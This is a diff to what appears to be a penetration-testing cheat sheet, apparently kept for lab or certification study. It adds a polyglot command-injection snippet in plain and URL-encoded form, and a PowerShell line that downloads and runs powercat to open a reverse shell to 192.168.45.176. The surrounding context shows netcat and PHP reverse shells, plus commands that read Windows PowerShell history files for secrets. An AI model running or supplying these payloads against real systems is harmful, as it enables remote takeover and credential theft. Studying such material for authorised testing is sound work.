@@ -9,7 +9,15 @@ root:null
 platform:platform
 ```
 
-# Windows juicy files 
+# Windows
+
+## Code Snippet to check where our code is executed
+```bash
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
+```
+
+## juicy files 
 ```bash
 > type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 > type C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
@@ -140,6 +148,11 @@ nc -e /bin/sh 192.168.45.176 80
 
 #PHP reverse shell
 php -r '$sock=fsockopen("192.168.45.176",80);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+
+#Powershell
+IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.176/powercat.ps1");powercat -c 192.168.45.176 -p 4444 -e powershell
+
 
 #Powershell: Create powershell reverse shell on kali linux
 $ kali@kali:~$ pwsh
